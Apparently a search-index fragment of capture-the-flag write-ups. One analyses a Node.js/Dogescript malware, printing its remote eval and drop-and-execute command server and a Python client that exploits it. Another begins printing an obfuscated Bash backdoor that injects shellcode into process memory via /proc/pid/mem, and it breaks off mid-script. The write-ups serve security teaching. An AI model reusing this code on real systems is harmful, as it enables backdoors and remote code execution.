linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=101536e3a95f4d38ffb8627533070d093d1ee165, with debug_info, not stripped Running strings on the binary reveals the file contains much JavaScript code. The last string returned is <nexe~~sentinel> , which gives us a clue as to how the binary was built. nexe is a tool that packages Node.js files into a single executable for easy distrbution. Digging through the file with an editor such as vi , we can laboriously look through all of the JavaScript files embedded in the malware. One chunk, however, jumps out as suspicious: it's not JavaScript, but a language known as dogescript (of course). Pulling out the Dogescript files, we see that this is the main program of the malware (trimmed for length): so tls as tls so fs as fs so dogeon as dson so dogescript as dogescript so . / muchmysterious as mysterious so child_process as cp very cript_key is plz Math . random with & dose toString with 36 & dose substr with 2 15 rly process . env . CRYPTZ is undefined plz console . loge with 'no cryptz key. doge can not crypt catz.' process dose exit with 1 wow very secrit_key = plz cript with process . env . CRYPTZ cript_key process . env . CRYPTZ is 'you dnt git key' delete process . env . CRYPTZ next networker_file is fs dose readFileSync with './networker.djs' & dose toString with 'utf-8' very networker_doge is plz dogescript with networker_file very Networker is plz eval with networker_doge ... ( much code . such doge . wow ) const server = tls . createServer ( options , ( socket ) => { console . log ( 'doge connected: ' , socket . authorized ? 'TOP doge' : 'not top doge' ); let networker = new Networker ( socket , ( data ) => { very doge_lingo is data dose toString plz console . log with 'top doge sez:' doge_lingo very doge_woof is plz dogeParam with doge_lingo networker dose send with doge_woof networker . send ( dogeParam ( data . toString ())); }); //networker dose init with 'such doge is yes wow' 'such doge is shibe wow' }); server . listen ( 41414 , () => { plz console . loge with 'doge waiting for command from top doge' }); server . on ( 'connection' , function ( c ) { plz console . loge with 'doge connect' }); server . on ( 'secureConnect' , function ( c ) { plz console . loge with 'doge connect secure' }); And a module for the network protocol: so crypto as crypto classy Networker maker socket handler dis giv socket is socket dis giv _packet is {} dis giv _process is false dis giv _state is 'HEADER' dis giv _payloadLength is 0 dis giv _bufferedBytes is 0 dis giv queue is [] dis giv handler is handler wow next ... ( more code . shibe good boi .) _send (){ very contentLength is plz Buffer . allocUnsafe with 4 plz contentLength . writeUInt32BE with this . _packet . header . length plz this . socket . write with contentLength plz this . socket . write with this . _packet . message this . _packet is {} } next wow woof Networker Thankfully, we don't have to learn Dogescript to reverse engineer the malware. An online translator is available that will turn this into actual JavaScript. Running the Dogescript files through the translator provides more readable code: Main program 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 var tls = require ( 'tls' ); var fs = require ( 'fs' ); var dson = require ( 'dogeon' ); var dogescript = require ( 'dogescript' ); var mysterious = require ( './muchmysterious' ); var cp = require ( 'child_process' ); var cript_key = Math . random () . toString ( 36 ) . substr ( 2 , 15 ); if ( process . env . CRYPTZ === undefined ) { console . log ( 'no cryptz key. doge can not crypt catz.' ); process . exit ( 1 ); } var secrit_key = cript ( process . env . CRYPTZ , cript_key ); process . env . CRYPTZ = 'you dnt git key' ; delete process . env . CRYPTZ ; networker_file = fs . readFileSync ( './networker.djs' ) . toString ( 'utf-8' ); var networker_doge = dogescript ( networker_file ); var Networker = eval ( networker_doge ); function cript ( input , key ) { var c = Buffer . alloc ( input . length ); while ( key . length < input . length ) { key += key ; } var ib = Buffer . from ( input ); var kb = Buffer . from ( key ); for ( i = 0 ; i < input . length ; i ++ ) { c [ i ] = ib [ i ] ^ kb [ i ] } return c . toString (); } function dogeParam ( buffer ) { var doge_command = dson . parse ( buffer ); var doge_response = {}; if ( ! ( 'dogesez' in doge_command )) { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge not sez' ; return dson . stringify ( doge_response ); } if ( doge_command . dogesez === 'ping' ) { doge_response [ 'dogesez' ] = 'pong' ; doge_response [ 'ohmaze' ] = doge_command . ohmaze ; } if ( doge_command . dogesez === 'do me a favor' ) { var favor = undefined ; var doge = undefined ; try { doge = dogescript ( doge_command . ohmaze ); favor = eval ( doge ); doge_response [ 'dogesez' ] = 'welcome' ; doge_response [ 'ohmaze' ] = favor ; } catch { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge sez no' ; } } if ( doge_command . dogesez === 'corn doge' ) { if (( ! ( 'batter' in doge_command ) || ! ( 'sausage' in doge_command ))) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'corn doge no batter or sausage' ; return dson . stringify ( doge_response ); } if (( ! ( 'meat' in doge_command [ 'sausage' ]) || ! ( 'flavor' in doge_command [ 'sausage' ]))) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'sausage no meat or flavor' ; return dson . stringify ( doge_response ); } var stupid = Array . isArray ( doge_command [ 'sausage' ][ 'flavor' ]); if ( ! stupid ) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'flavor giv not levl' ; return dson . stringify ( doge_response ); } var stupidtoo = Buffer . from ( doge_command . batter , 'base64' ) . toString ( 'base64' ); if ( stupidtoo === doge_command . batter ) { doge_response [ 'dogesez' ] = 'eated' ; var meat = doge_command [ 'sausage' ][ 'meat' ]; var flavor = doge_command [ 'sausage' ][ 'flavor' ]; var doge_carnval = Buffer . from ( doge_command . batter , 'base64' ); var randome = Math . random () . toString ( 36 ) . substr ( 2 , 9 ) var filename = '/tmp/corndoge-' + randome + '.node' ; fs . writeFileSync ( filename , doge_carnval ); try { var doge_module = require ( '' + filename + '' ); var retval = doge_module [ meat ](... flavor ); doge_response [ 'taste' ] = retval ; } catch { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'bad corn doge' ; } finally { delete require . cache [ require . resolve ( filename )] }; } else { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'all bout base six fur' ; } } if ( doge_command . dogesez === 'hot doge' ) { if (( ! ( 'bread' in doge_command ) || ! ( 'sausage' in doge_command ))) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'hot doge no bread or sausage' ; return dson . stringify ( doge_response ); } if ( ! 'flavor' in doge_command [ 'sausage' ]) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'sausage no flavor' ; return dson . stringify ( doge_response ); } var stupid = Array . isArray ( doge_command [ 'sausage' ][ 'flavor' ]); if ( ! stupid ) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'flavor giv not levl' ; return dson . stringify ( doge_response ); } var stupidtoo = Buffer . from ( doge_command . bread , 'base64' ) . toString ( 'base64' ); if ( stupidtoo === doge_command . bread ) { doge_response [ 'dogesez' ] = 'eated' ; var flavor = doge_command [ 'sausage' ][ 'flavor' ]; var doge_carnval = Buffer . from ( doge_command . bread , 'base64' );; var randome = Math . random () . toString ( 36 ) . substr ( 2 , 9 ) var filename = '/tmp/hotdoge-' + randome + '.bin' ; fs . writeFileSync ( filename , doge_carnval ); fs . chmodSync ( filename , '755' ); try { var retval = cp . execFileSync ( filename , flavor ); doge_response [ 'taste' ] = retval . toString ( 'utf-8' ); } catch ( error ) { if ( 'status' in error ) { doge_response [ 'dogesez' ] = 'eated' ; var errstd = error . stdout . toString ( 'utf-8' ); var errerr = error . stderr . toString ( 'utf-8' ); doge_response [ 'taste' ] = errstd ; doge_response [ 'error' ] = errerr ; if ( error . status === 27 ) { doge_response [ 'shibe' ] = 'wow such module thx top doge' ; } } else { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'bad hot doge' ; } } finally { delete require . cache [ require . resolve ( filename )] }; } else { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'all bout base six fur' ; } } return dson . stringify ( doge_response ); } const options = { key : servs_key , cert : servs_cert , requestCert : true , rejectUnauthorized : true , ca : [ doge_ca ] }; const server = tls . createServer ( options , ( socket ) => { console . log ( 'doge connected: ' , socket . authorized ? 'TOP doge' : 'not top doge' ); let networker = new Networker ( socket , ( data ) => { var doge_lingo = data . toString (); // console.log('top doge sez:', doge_lingo); var doge_woof = dogeParam ( doge_lingo ); networker . send ( doge_woof ); // networker.send(dogeParam(data.toString())); }); networker . init ( 'such doge is yes wow' , 'such doge is shibe wow' ); }); server . listen ( 41414 , () => { console . log ( 'doge waiting for command from top doge' ); }); server . on ( 'connection' , function ( c ) { console . log ( 'doge connect' ); }); server . on ( 'secureConnect' , function ( c ) { console . log ( 'doge connect secure' ); }); Network protocol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 var crypto = require ( 'crypto' ); class Networker { constructor ( socket , handler ) { this . socket = socket ; this . _packet = {}; this . _process = false ; this . _state = 'HEADER' ; this . _payloadLength = 0 ; this . _bufferedBytes = 0 ; this . queue = []; this . handler = handler ; }; init ( hmac_key , aes_key ) { var salty_wow = 'suchdoge4evawow' ; this . hmac_key = crypto . pbkdf2Sync ( hmac_key , salty_wow , 4096 , 16 , 'sha256' ); this . aes_key = crypto . pbkdf2Sync ( aes_key , salty_wow , 4096 , 16 , 'sha256' ); var f1 = ( data ) => { this . _bufferedBytes += data . length ; this . queue . push ( data ); this . _process = true ; this . _onData (); }; this . socket . on ( 'data' , f1 ); this . socket . on ( 'error' , function ( err ) { console . log ( 'Socket not shibe: ' , err ); }); var dis_handle = this . handler ; this . socket . on ( 'served' , dis_handle ); }; _hasEnough ( size ) { if ( this . _bufferedBytes >= size ) { return true ; } this . _process = false ; return false ; }; _readBytes ( size ) { let result ; this . _bufferedBytes -= size ; if ( size === this . queue [ 0 ]. length ) { return this . queue . shift (); } if ( size < this . queue [ 0 ]. length ) { result = this . queue [ 0 ]. slice ( 0 , size ); this . queue [ 0 ] = this . queue [ 0 ]. slice ( size ); return result ; } result = Buffer . allocUnsafe ( size ); let offset = 0 ; let length ; while ( size > 0 ) { length = this . queue [ 0 ]. length ; if ( size >= length ) { this . queue [ 0 ]. copy ( result , offset ); offset += length ; this . queue . shift (); } else { this . queue [ 0 ]. copy ( result , offset , 0 , size ); this . queue [ 0 ] = this . queue [ 0 ]. slice ( size ); } size -= length ; } return result ; }; _getHeader () { let stupid = this . _hasEnough ( 4 ); if ( stupid ) { this . _payloadLength = this . _readBytes ( 4 ). readUInt32BE ( 0 , true ); this . _state = 'PAYLOAD' ; } }; _getPayload () { let stupid = this . _hasEnough ( this . _payloadLength ); if ( stupid ) { let received = this . _readBytes ( this . _payloadLength ); this . _parseMessage ( received ); this . _state = 'HEADER' ; } }; _onData ( data ) { while ( this . _process ) { if ( this . _state === 'HEADER' ) { this . _getHeader (); } if ( this . _state === 'PAYLOAD' ) { this . _getPayload (); } } }; _encrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_cripter = crypto . createCipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_cripter . setAutoPadding ( true ); return Buffer . concat ([ wow_cripter . update ( data ), wow_cripter . final ()]); }; _decrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_decripter = crypto . createDecipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_decripter . setAutoPadding ( true ); return Buffer . concat ([ wow_decripter . update ( data ), wow_decripter . final ()]); }; send ( message ) { let hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); let mbuf = this . _encrypt ( message ); hmac . update ( mbuf ); let chksum = hmac . digest (); let buffer = Buffer . concat ([ chksum , mbuf ]); this . _header ( buffer . length ); this . _packet . message = buffer ; this . _send (); }; _parseMessage ( received ) { var hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); var checksum = received . slice ( 0 , 32 ) . toString ( 'hex' ); var message = received . slice ( 32 ); hmac . update ( message ); let stupid = hmac . digest ( 'hex' ); if ( checksum === stupid ) { var dec_message = this . _decrypt ( message ); this . socket . emit ( 'served' , dec_message ); } }; _header ( messageLength ) { this . _packet . header = { length : messageLength }; }; _send () { var contentLength = Buffer . allocUnsafe ( 4 ); contentLength . writeUInt32BE ( this . _packet . header . length ); this . socket . write ( contentLength ); this . socket . write ( this . _packet . message ); this . _packet = {}; }; } module . exports = Networker Also inside the malware is an embedded client certificate and RSA private key, which are needed to authenticate against the malware server. Digging into the start of the main program, we see the method used to generate the key: 8 9 10 11 12 13 14 15 16 17 18 var cript_key = Math . random () . toString ( 36 ) . substr ( 2 , 15 ); if ( process . env . CRYPTZ === undefined ) { console . log ( 'no cryptz key. doge can not crypt catz.' ); process . exit ( 1 ); } var secrit_key = cript ( process . env . CRYPTZ , cript_key ); process . env . CRYPTZ = 'you dnt git key' ; delete process . env . CRYPTZ ; A random cript_key is generated, then passed to the cript() function along with the contents of the environment variable CRYPTZ , the result of which is stored in secrit_key . The CRYPTZ environment variable is then set to a value ( you dnt get key ), then deleted from memory, presumably in an attempt to prevent it's content from being discovered by memory forensics. However, the same process is not performed on on the cript_key variable, which will be important later. The cript() function is a simple XOR of the two arguments: 24 25 26 27 28 29 30 31 32 33 34 35 function cript ( input , key ) { var c = Buffer . alloc ( input . length ); while ( key . length < input . length ) { key += key ; } var ib = Buffer . from ( input ); var kb = Buffer . from ( key ); for ( i = 0 ; i < input . length ; i ++ ) { c [ i ] = ib [ i ] ^ kb [ i ] } return c . toString (); } Continuing through the program, we see a function that parses commands sent to the server: 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 function dogeParam ( buffer ) { var doge_command = dson . parse ( buffer ); var doge_response = {}; if ( ! ( 'dogesez' in doge_command )) { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge not sez' ; return dson . stringify ( doge_response ); } if ( doge_command . dogesez === 'ping' ) { doge_response [ 'dogesez' ] = 'pong' ; doge_response [ 'ohmaze' ] = doge_command . ohmaze ; } if ( doge_command . dogesez === 'do me a favor' ) { var favor = undefined ; var doge = undefined ; try { doge = dogescript ( doge_command . ohmaze ); favor = eval ( doge ); doge_response [ 'dogesez' ] = 'welcome' ; doge_response [ 'ohmaze' ] = favor ; } catch { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge sez no' ; } } ... The function is passed a buffer containing a command string, which is encoded as DSON , or Doge Serialized Object Notation (sigh). The malware is using the dogeon serializer to parse the requests from the client. Commands from the client are passed as the value of the dogesez attribute. There are many different commands, but the important one is 'do me a favor' , which runs a Dogescript and returns the result to the caller. We can also perform a 'ping' to the server to check that our messages are being received correctly. The remaining commands deal with encrypting files sent to the server, but for the purposes of this CTF aren't necessary. At the end of the main program is the code that handles connections from the client: 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 const options = { key : servs_key , cert : servs_cert , requestCert : true , rejectUnauthorized : true , ca : [ doge_ca ] }; const server = tls . createServer ( options , ( socket ) => { console . log ( 'doge connected: ' , socket . authorized ? 'TOP doge' : 'not top doge' ); let networker = new Networker ( socket , ( data ) => { var doge_lingo = data . toString (); // console.log('top doge sez:', doge_lingo); var doge_woof = dogeParam ( doge_lingo ); networker . send ( doge_woof ); // networker.send(dogeParam(data.toString())); }); networker . init ( 'such doge is yes wow' , 'such doge is shibe wow' ); }); server . listen ( 41414 , () => { console . log ( 'doge waiting for command from top doge' ); }); server . on ( 'connection' , function ( c ) { console . log ( 'doge connect' ); }); server . on ( 'secureConnect' , function ( c ) { console . log ( 'doge connect secure' ); }); The tls.createServer function creates a server to receive requests. The options specify that the server will request a certificate from the client, and will reject any connections from clients that don't. Finally, the data is passed through a networker object, defined in the Network protocol above. We see the init method of the networker object is called with two strings: such doge is yes wow and such doge is dhibe wow . These phrases are combined with the salt suchdoge4evawow to create two keys: 1 for an HMAC algorithm, and one for AES encryption. 16 17 18 19 init ( hmac_key , aes_key ) { var salty_wow = 'suchdoge4evawow' ; this . hmac_key = crypto . pbkdf2Sync ( hmac_key , salty_wow , 4096 , 16 , 'sha256' ); this . aes_key = crypto . pbkdf2Sync ( aes_key , salty_wow , 4096 , 16 , 'sha256' ); The encryption method used is AES, in CBC-128 mode: 100 101 102 103 104 105 106 107 108 109 110 111 _encrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_cripter = crypto . createCipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_cripter . setAutoPadding ( true ); return Buffer . concat ([ wow_cripter . update ( data ), wow_cripter . final ()]); }; _decrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_decripter = crypto . createDecipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_decripter . setAutoPadding ( true ); return Buffer . concat ([ wow_decripter . update ( data ), wow_decripter . final ()]); }; The meat of the network protocl is in the send() and _send() methods: 112 113 114 115 116 117 118 119 120 121 send ( message ) { let hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); let mbuf = this . _encrypt ( message ); hmac . update ( mbuf ); let chksum = hmac . digest (); let buffer = Buffer . concat ([ chksum , mbuf ]); this . _header ( buffer . length ); this . _packet . message = buffer ; this . _send (); }; 139 140 141 142 143 144 145 _send () { var contentLength = Buffer . allocUnsafe ( 4 ); contentLength . writeUInt32BE ( this . _packet . header . length ); this . socket . write ( contentLength ); this . socket . write ( this . _packet . message ); this . _packet = {}; }; The message is encrypted with the AES keys created in init() method, then an HMAC of the encrypted content is generated and is prepended to the message. The message is actually sent in the _send() method, which first writes an unsigned 32-bit number containing the length of the message to the socket, then the message itself. Incoming messages are handled in reverse, in the _parseMessage() function. The checksum passed with the message is stripped from the beginning, a new checksum is generated to compare against the received one, and if the checksums match, the message is decrypted and returned to the server. 122 123 124 125 126 127 128 129 130 131 132 133 _parseMessage ( received ) { var hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); var checksum = received . slice ( 0 , 32 ) . toString ( 'hex' ); var message = received . slice ( 32 ); hmac . update ( message ); let stupid = hmac . digest ( 'hex' ); if ( checksum === stupid ) { var dec_message = this . _decrypt ( message ); this . socket . emit ( 'served' , dec_message ); } }; With all of these pieces, we can build a Python script to emulate the malware's communication with the server: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 #!/usr/bin/env python3 # CATAPULT SPIDER malware protocol # # Joe Ammond (pugpug) @joeammond import sys from pwn import * from Crypto.Protocol.KDF import PBKDF2 from Crypto.Hash import SHA512 , SHA256 , HMAC from Crypto.Random import get_random_bytes from Crypto.Cipher import AES # Create the HMAC and AES keys salty_wow = 'suchdoge4evawow' hmac_wow = 'such doge is yes wow' aes_wow = 'such doge is shibe wow' hmac_key = PBKDF2 ( hmac_wow , salty_wow , 16 , count = 4096 , hmac_hash_module = SHA256 ) aes_key = PBKDF2 ( aes_wow , salty_wow , 16 , count = 4096 , hmac_hash_module = SHA256 ) # Who we communicate with host = 'veryprotocol.challenges.adversary.zone' # Client certificate and private key, from the malware executable ssl_opts = { 'keyfile' : 'doge_key' , 'certfile' : 'doge_cert' , } # Encrypt the message, and prepend the HMAC def encrypt ( data ): iv = b ' \\0 ' * 16 cipher = AES . new ( aes_key , AES . MODE_CBC , iv = iv ) length = 16 - ( len ( data ) % 16 ) data += bytes ([ length ]) * length enc = cipher . encrypt ( data ) hmac = HMAC . new ( hmac_key , digestmod = SHA256 ) hmac . update ( enc ) digest = hmac . digest () return ( digest + enc ) # Decrypt the message, and verify that the HMAC matches def decrypt ( data ): checksum = data [: 32 ] . hex () message = data [ 32 :] hmac = HMAC . new ( hmac_key , digestmod = SHA256 ) hmac . update ( message ) verify = hmac . hexdigest () if checksum == verify : iv = b ' \\0 ' * 16 cipher = AES . new ( aes_key , AES . MODE_CBC , iv = iv ) plaintext = cipher . decrypt ( message ) return ( plaintext ) else : return 'bonk' # Main loop: read a DSON string, encrypt it, send it to the server, # receive the response, print it. while True : # Read a string command = bytes ( input ( 'Shibe sez? ' ) . strip (), 'utf-8' ) # Shibe sez quit if command == 'quit' : sys . exit ( 0 ) # Connect to the server r = remote ( host , 41414 , ssl = True , ssl_args = ssl_opts ) # Encrypt it ciphertext = encrypt ( command ) # Send the message length as u32, then the message length = p32 ( len ( ciphertext ), endianness = \"big\" , sign = \"unsigned\" ) r . send ( length ) r . send ( ciphertext ) # Read the response length, and the message length = r . recv ( 4 ) response = r . recvall ( timeout = 5 ) r . close () # Decrypt the message and print it plaintext = decrypt ( response ) print ( plaintext ) print () The code is fairly straightforward. To retrieve the key from the server, we can use the cript() function with the cript_key value generated by the server. Running XOR on the secrit_key with the cript_key reverses the \"encryption\", revealing the original value of the CRYPTZ environment variable: (pwn) xps15$ python3 hammer.py Shibe sez? such \"dogesez\" is \"do me a favor\" next \"ohmaze\" is \"cript(secrit_key, cript_key)\" wow [+] Opening connection to veryprotocol.challenges.adversary.zone on port 41414: Done [+] Receiving all data: Done (128B) [*] Closed connection to veryprotocol.challenges.adversary.zone port 41414 b'such \"dogesez\" is \"welcome\" next \"ohmaze\" is \"CS{such_Pr0t0_is_n3tw0RkS_w0W}\" wow\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f' And there's the flag: CS{such_Pr0t0_is_n3tw0RkS_w0W}.","title":"Solution"},{"location":"CatapultSpider/veryprotocol/#answer","text":"CS{such_Pr0t0_is_n3tw0RkS_w0W}","title":"Answer"},{"location":"SpaceJackal/injector/","text":"SPACE JACKAL - Injector # From the second message on SPACE JACKAL's board, 'rudi' has left a backdoor on his former employer's systems. Challenge description # The decrypted forum messages revealed that a disgruntled employee at one of our customers joined SPACE JACKAL and backdoored a host at their employer before they quit. Our customer provided us with a snapshot of that machine . Please identify the backdoor and validate your findings against our test instance of that host, which is available at injector.challenges.adversary.zone . Solution # We're given a .tar.xz file containing a qcow2 disk image and a shell script to run the snapshot. After extracting the .tar file, we can convert the qcow2 image to raw format and mount it: xps15$ qemu-img convert art_ctf_injector_local.qcow2 art_ctf_injector_local.raw xps15$ ls -hl art_ctf_injector_local.* -rw-r--r-- 1 jra jra 2.8G Jan 23 20:54 art_ctf_injector_local.qcow2 -rw-r--r-- 1 jra jra 10G Jan 28 16:02 art_ctf_injector_local.raw root@xps15# losetup -f # (ubuntu LOL) /dev/loop29 root@xps15# losetup -P /dev/loop29 art_ctf_injector_local.raw root@xps15# fdisk -l /dev/loop29 Disk /dev/loop29: 10 GiB, 10737418240 bytes, 20971520 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 62B0CFE7-BB10-47FE-B235-AD95F16E8072 Device Start End Sectors Size Type /dev/loop29p1 2048 4095 2048 1M BIOS boot /dev/loop29p2 4096 20969471 20965376 10G Linux filesystem root@xps15# mount -r /dev/loop29p2 /mnt root@xps15# ls /mnt bin cdrom etc lib lib64 lost+found mnt proc run srv tmp var boot dev home lib32 libx32 media opt root sbin sys usr As a quick test, we can run tools like rkhunter or chkrootkit to see whether rudi used an off-the-shelf rootkit to backdoor the system: root@xps15# chkrootkit -r /mnt ROOTDIR is `/mnt/' Checking `amd'... not found Checking `basename'... not infected Checking `biff'... not found ... Searching for Backdoor.Linux.Mokes.a ... nothing found Searching for Malicious TinyDNS ... nothing found Searching for Linux.Xor.DDoS ... INFECTED: Possible Malicious Linux.Xor.DDoS installed /mnt/tmp/.hax/injector.sh /tmp/.hax/injector.sh definitely looks suspicious: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 #!/bin/bash set -e roth8Kai () { for i in $( seq 0 7 ) ; do curr = $(( $1 >> $i * 8 & 0 xff )) packed = \" $packed $( printf '\\\\x%02x' $curr ) \" done echo $packed } ieph2Oon () { echo $(( 0 x $( nm -D \" $1 \" | sed 's/@.*//' | grep -E \" $2 $ \" | cut -d ' ' -f1 ))) } QueSh8yi () { echo -ne \" $3 \" | dd of = \"/proc/ $1 /mem\" bs = 1 \"seek= $2 \" conv = notrunc 2 >/dev/null } ojeequ9I () { code = \" $1 \" from = $( echo \" $2 \" | sed 's/\\\\/\\\\\\\\/g' ) to = $( echo $3 | sed 's/\\\\/\\\\\\\\/g' ) echo $code | sed \"s/ $from / $to /g\" } xeiCh4xi () { echo \" $1 \" | base64 -d | gzip -d } ia5Uuboh () { go7uH1yu = \" $1 \" ih9Ea1se = $( grep -E \"/libc.*so $ \" \"/proc/ $go7uH1yu /maps\" | head -n 1 | tr -s ' ' ) Teixoo1Z = $(( 0 x $( cut -d '-' -f1 <<< \" $ih9Ea1se \" ))) cu1eiSe9 = $( cut -d ' ' -f6 <<< \" $ih9Ea1se \" ) eo0oMaeL = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA == )))) de0fie1O = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA = )))) EeGie9qu = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA )))) Eeko2juZ = $(( Teixoo1Z+ $( ieph2Oon $cu1eiSe9 $( xeiCh4xi H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA = )))) Iek6Joyo = $(( 0 x $( grep -E \"/libc.*so $ \" \"/proc/ $go7uH1yu /maps\" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2 ))) HeiSuC5o = '\\x48\\xb8\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x55\\x49\\xbd\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x41\\x54\\x49\\x89\\xfc\\x55\\x53\\x4c\\x89\\xe3\\x52\\xff\\xd0\\x48\\x89\\xc5\\x48\\xb8\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x48\\xc7\\x00\\x00\\x00\\x00\\x00\\x48\\x83\\xfd\\x05\\x76\\x61\\x80\\x3b\\x63\\x75\\x54\\x80\\x7b\\x01\\x6d\\x75\\x4e\\x80\\x7b\\x02\\x64\\x75\\x48\\x80\\x7b\\x03\\x7b\\x75\\x42\\xc6\\x03\\x00\\x48\\x8d\\x7b\\x04\\x48\\x8d\\x55\\xfc\\x48\\x89\\xf8\\x8a\\x08\\x48\\x89\\xc3\\x48\\x89\\xd5\\x48\\x8d\\x40\\x01\\x48\\x8d\\x52\\xff\\x8d\\x71\\xe0\\x40\\x80\\xfe\\x5e\\x77\\x1b\\x80\\xf9\\x7d\\x75\\x08\\xc6\\x03\\x00\\x41\\xff\\xd5\\xeb\\x0e\\x48\\x83\\xfa\\x01\\x75\\xd4\\xbd\\x01\\x00\\x00\\x00\\x48\\x89\\xc3\\x48\\xff\\xc3\\x48\\xff\\xcd\\xeb\\x99\\x48\\xb8\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x4c\\x89\\xe7\\xff\\xd0\\x48\\xb8\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x48\\xa3\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x58\\x5b\\x5d\\x41\\x5c\\x41\\x5d\\xc3' HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41' $( roth8Kai $Eeko2juZ )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42' $( roth8Kai $EeGie9qu )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43' $( roth8Kai $de0fie1O )) HeiSuC5o = $( ojeequ9I $HeiSuC5o '\\x44\\x44\\x44\\x44\\x44\\x44\\x44\\x44' $( roth8Kai $eo0oMaeL )) Que2vah0 = $( echo -ne $HeiSuC5o | wc -c ) Thee6ahB = $(( $Iek6Joyo - $Que2vah0 )) HeiSuC5o = $( 